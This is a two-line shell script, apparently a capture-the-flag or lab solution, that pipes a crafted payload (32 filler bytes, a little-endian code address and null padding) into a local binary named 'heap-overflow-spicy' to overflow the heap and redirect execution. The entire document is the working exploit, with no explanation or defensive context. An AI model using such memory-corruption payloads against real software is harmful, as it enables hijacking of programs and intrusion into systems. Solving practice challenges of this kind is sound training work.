#! /bin/sh
python2 -c "print 'A'*32 + '\x67\x11\x40' + '\x00'*8" | ./heap-overflow-spicy
